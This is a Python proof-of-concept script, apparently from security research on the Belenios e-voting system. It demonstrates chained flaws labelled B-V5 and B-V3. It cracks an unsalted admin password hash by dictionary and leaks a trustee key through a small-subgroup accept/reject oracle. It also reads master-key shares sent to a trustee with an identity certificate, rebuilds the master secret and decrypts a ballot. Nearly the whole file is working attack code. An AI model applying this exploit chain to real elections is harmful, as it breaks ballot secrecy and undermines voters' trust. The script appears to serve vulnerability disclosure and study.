import time
import hashlib
import random
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "helios"))
import belenios_core as B
import dkg
from common_subgroup import element_of_order, pohlig_hellman_prime_power, crt_combine


def crack_admin_password(record, wordlist, throughput=1.0e11):
    t0 = time.perf_counter()
    tried = 0
    for pw in wordlist:
        tried += 1
        if B.Password.check(record, pw):
            dt = time.perf_counter() - t0
            return pw, tried, dt
    return None, tried, time.perf_counter() - t0


def gcm_oracle(G, trustee_dk, y_alpha, y_beta, y_data):
    ct = {"y_alpha": y_alpha, "y_beta": y_beta, "y_data": y_data}
    return B.decrypt(G, trustee_dk, ct) is not None


def subgroup_oracle_recover(G, trustee_dk, prime_powers, verbose=False):
    p = G.p
    cof = (p - 1) // G.q
    residues = []
    queries = 0
    target = G.g
    for (ell, e) in prime_powers:
        modulus = ell ** e
        h = element_of_order(p, G.q, cof, ell, e)
        if h is None:
            continue
        found = None
        for r in range(modulus):
            queries += 1
            y_alpha = h
            y_beta = G.mul(target, G.pow(h, r))
            nonce = hashlib.sha256(("iv|" + str(y_alpha)).encode()).digest()[:12]
            aeskey = hashlib.sha256(("key|" + str(target)).encode()).digest()
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            y_data = AESGCM(aeskey).encrypt(nonce, b"probe", None)
            if gcm_oracle(G, trustee_dk, y_alpha, y_beta, y_data):
                found = r
                break
        if found is not None:
            residues.append((found, modulus))
            if verbose:
                print("    order %-4d : accept at r=%-3d  ->  dk mod %-4d = %d (%d queries so far)"
                      % (modulus, found, modulus, found, queries))
    x_rec, M = crt_combine(residues)
    return x_rec, M, queries


def degenerate_identity_read(G, trustees, target_trustees, rng):
    override = {j: 1 for j in target_trustees}
    channel = dkg.distribute_shares(G, trustees, rng, override_ek=override)
    recovered = {}
    for j in target_trustees:
        shares_to_j = []
        for i in range(len(trustees)):
            ct = channel[(i, j)]
            shared = ct["y_beta"]
            aeskey = hashlib.sha256(("key|" + str(shared)).encode()).digest()
            nonce = hashlib.sha256(("iv|" + str(ct["y_alpha"])).encode()).digest()[:12]
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            pt = AESGCM(aeskey).decrypt(nonce, ct["y_data"], None)
            shares_to_j.append(int(pt.decode().split("|")[1]))
        recovered[j] = sum(shares_to_j) % G.q
    return recovered


def run():
    print("=" * 74)
    print("Belenios B1 : trustee setup-channel compromise  (flaws B-V5 + B-V3)")
    print("=" * 74)
    G = B.belenios_group()

    print("\n[V5] Offline admin-password recovery (single unsalted-iteration SHA-256).")
    rng = random.Random(7)
    record = B.Password.make("s3cret-vote-admin", rng)
    wordlist = ["password", "admin123", "belenios", "s3cret-vote-admin", "zzz"]
    print("    stored record: sha256(salt || pw), salt = %r (~47-bit)" % record["salt"])
    pw, tried, dt = crack_admin_password(record, wordlist)
    guesses_50bit = 2 ** 50
    est = guesses_50bit / 1.0e11
    print("    recovered admin password %r after %d dictionary guesses (%.4f ms)" % (pw, tried, dt * 1000))
    print("    a 50-bit password at 1e11 SHA-256/s (GPU) falls in %.1f h with no KDF cost" % (est / 3600.0))
    print("    -> the adversary now holds the mediating-server position for B-V3.")

    n, t = 4, 3
    seeds = [B.Password.b58_token(22, rng) for _ in range(n)]
    trustees, Y, master = dkg.run_dkg(G, seeds, t, rng)
    print("\n[setup] DKG with n=%d trustees, threshold t=%d; joint key Y = g^s established." % (n, t))

    print("\n[V3-a] Small-subgroup accept/reject oracle on the KEM channel (pki.ml decrypt).")
    print("       Missing G.check on y_alpha lets a crafted low-order element leak dk mod d.")
    victim = trustees[0]
    x_rec, M, queries = subgroup_oracle_recover(G, victim.dk, [(2, 1), (3, 1)], verbose=True)
    print("    combined: dk mod %d = %d  (matches true dk mod %d: %s) in %d oracle queries"
          % (M, x_rec, M, (victim.dk % M) == x_rec, queries))
    print("    default group smooth cofactor is only {2,3}; full dk needs the smooth/Ed25519")
    print("    regime, quantified in the paper. The degenerate variant below is unconditional.")

    print("\n[V3-b] Degenerate certificate: cert_encryption = identity is accepted (no G.check).")
    print("       Every share sent to such a trustee has a PUBLIC AES key sha256('key'||y_beta).")
    targets = [0, 1, 2]
    recovered_shares = degenerate_identity_read(G, trustees, targets, rng)
    pts = [(j + 1, recovered_shares[j]) for j in targets]
    s_rec = dkg.lagrange_reconstruct(G, pts)
    print("    read master-key shares F(j) for trustees %s directly off the board." % targets)
    print("    Lagrange over %d shares -> master secret s (matches: %s)" % (t, s_rec == master))

    print("\n[decrypt] Use the recovered master secret to open a target honest ballot.")
    ct, r = B.eg_encrypt(G, Y, 1, rng)
    dec = G.pow(ct["alpha"], s_rec)
    m = G.mul(ct["beta"], G.inv(dec))
    bit = 0 if m == 1 else (1 if m == G.g else "?")
    print("    decrypted plaintext bit = %s (true = 1)   -> BPRIV broken, advantage ~ 1" % bit)

    print("\nRESULT: B-V5 grants the server role; B-V3 (missing subgroup/identity checks) then")
    print("        recovers the master decryption key, opening every ballot on the board.")


if __name__ == "__main__":
    run()
